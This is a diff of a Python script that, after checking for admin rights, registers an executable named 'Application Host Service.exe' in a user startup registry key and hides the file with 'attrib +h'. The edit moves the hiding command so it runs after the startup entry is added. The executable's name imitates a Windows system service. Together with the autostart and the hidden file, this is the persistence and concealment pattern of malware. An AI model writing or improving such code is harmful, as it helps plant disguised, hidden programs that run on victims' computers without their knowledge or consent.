@@ -44,7 +44,6 @@ if run_as_admin():
 
         # Get the path to the executable (assuming it's in the same directory)
         executable_path = os.path.abspath(rf"{Drive_Letter}Application Host Service.exe")
-        Exe_Path=rf"{Drive_Letter}Application Host Service.exe"
 
 
         # Create the registry key for the startup entry
@@ -54,8 +53,6 @@ if run_as_admin():
         try:
             with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as key:
                 winreg.SetValueEx(key, key_name, 0, winreg.REG_SZ, executable_path)
-                os.system(f"attrib +h {Exe_Path}")
-
                 # print(f"Added to startup: {executable_path}")
                 pass
         except Exception as e:
@@ -66,6 +63,7 @@ if run_as_admin():
     drive_letters = list_drive_letters()
     A=drive_letters[1]
     drive_letter = A+"/"
+
 
 
     #  move_exe_file Fuction I💠
@@ -79,5 +77,9 @@ if run_as_admin():
 
     # Add_to_startup() Fuction 💠
     add_to_startup(drive_letter)
+    
+    Exe_Path=rf"{drive_letter}\Application Host Service.exe"
+    os.system(f"attrib +h \"{Exe_Path}\"")
+
 
 
